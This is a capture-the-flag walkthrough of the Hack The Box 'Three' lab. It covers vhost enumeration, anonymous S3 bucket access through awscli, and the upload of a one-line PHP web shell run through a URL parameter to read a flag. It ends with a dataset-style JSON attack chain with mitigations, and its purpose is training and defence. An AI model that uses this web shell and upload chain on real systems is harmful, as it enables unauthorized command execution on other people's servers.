# HTB Three - S3 Bucket Misconfiguration Playbook

Target theme:
- Host and subdomain enumeration
- Anonymous S3 bucket access
- Arbitrary upload leading to web command execution

Use only in authorized lab scope.

---

## 1. Objective

1. enumerate exposed services,
2. discover virtual hosts/subdomains,
3. interact with exposed S3-style endpoint,
4. validate upload execution risk,
5. retrieve target artifact.

---

## 2. Initial Scan

```bash
nmap -sC -sV -oA nmap_three <TARGET_IP>
```

Expected:
- 22/tcp open (SSH)
- 80/tcp open (HTTP)

Task answer:
- open TCP ports: 2

---

## 3. Web and Hostname Recon

From website contact info, discover domain:
- `thetoppers.htb`

Add local resolution:

```bash
echo "<TARGET_IP> thetoppers.htb" | sudo tee -a /etc/hosts
```

Task answer:
- host resolution file: `/etc/hosts`

---

## 4. Subdomain Enumeration

```bash
gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/dirb/common.txt
```

Expected discovery:
- `s3.thetoppers.htb`

Add it:

```bash
echo "<TARGET_IP> s3.thetoppers.htb" | sudo tee -a /etc/hosts
```

---

## 5. AWS CLI Interaction with Custom Endpoint

Install and configure CLI:

```bash
sudo apt install awscli
aws configure
```

List buckets:

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls
```

List bucket contents:

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```

Task answers:
- service on discovered subdomain: Amazon S3
- utility: awscli
- setup command: `aws configure`
- command to list buckets: `aws s3 ls`

---

## 6. Upload and Execution Validation (Lab Context)

Create test PHP command wrapper:

```php
<?php system($_GET["cmd"]); ?>
```

Upload:

```bash
aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

Execute command via web path:

```text
http://thetoppers.htb/shell.php?cmd=ls
```

Task answer:
- scripting language: PHP

---

## 7. Terminal Evidence (Condensed)

```text
analyst@kali:~$ nmap -sC -sV 10.129.45.155
PORT   STATE SERVICE VERSION
22/tcp open  ssh
80/tcp open  http

analyst@kali:~$ gobuster vhost -u http://thetoppers.htb -w /usr/share/wordlists/dirb/common.txt
Found: s3.thetoppers.htb (Status: 301)

analyst@kali:~$ aws --endpoint-url http://s3.thetoppers.htb s3 ls
2026-04-20 13:03:07 thetoppers.htb

analyst@kali:~$ aws --endpoint-url http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
upload: ./shell.php to s3://thetoppers.htb/shell.php

Browser -> http://thetoppers.htb/shell.php?cmd=cat+../flag.txt
HTB{...flag...}
```

---

## 8. Analyst Reasoning Chain (Dataset-Style)

```json
{
	"scenario": "three_s3_upload_to_web_exec",
	"input_signals": [
		"HTTP service with identifiable domain hint thetoppers.htb",
		"Virtual host enumeration discovered s3.thetoppers.htb",
		"S3 endpoint allowed bucket listing and object upload",
		"Uploaded PHP object became executable via web path"
	],
	"attack_chain": [
		{
			"step": 1,
			"tactic": "reconnaissance",
			"technique": "Web and Subdomain Discovery",
			"confidence": 0.95,
			"evidence": "contact domain + gobuster vhost output"
		},
		{
			"step": 2,
			"tactic": "initial_access",
			"technique": "Anonymous/Improper S3 Access",
			"confidence": 0.93,
			"evidence": "aws s3 ls worked on custom endpoint"
		},
		{
			"step": 3,
			"tactic": "execution",
			"technique": "Arbitrary File Upload Leading to Command Execution",
			"confidence": 0.9,
			"evidence": "uploaded shell.php executed through web endpoint"
		},
		{
			"step": 4,
			"tactic": "collection",
			"technique": "Data from Local System",
			"confidence": 0.84,
			"evidence": "flag read via command parameter"
		}
	],
	"hypotheses": [
		"Bucket permissions may allow overwrite of existing production assets",
		"Additional subdomains may map to similarly misconfigured object stores",
		"Arbitrary upload could permit broader persistence beyond one script"
	],
	"uncertainties": [
		"Unknown if write permissions are anonymous or role-scoped",
		"Extent of object execution policy across filetypes not fully tested",
		"No evidence yet of WAF/object event monitoring"
	],
	"tool_calls": [
		{"name": "vhost_discovery_correlator", "priority": "high"},
		{"name": "s3_policy_audit", "priority": "high"},
		{"name": "upload_execution_validator", "priority": "medium"}
	],
	"mitigation": {
		"immediate": [
			"Disable public write/list on bucket",
			"Remove uploaded malicious objects",
			"Rotate any exposed secrets in bucket content"
		],
		"hardening": [
			"Apply least-privilege bucket IAM and explicit deny policies",
			"Block script execution from object storage delivery paths",
			"Enforce signed upload workflows and content-type validation"
		],
		"monitoring": [
			"Alert on public bucket ACL/policy changes",
			"Track unexpected object uploads and web execution patterns",
			"Monitor anomalous S3 API usage from unknown clients"
		]
	}
}
```
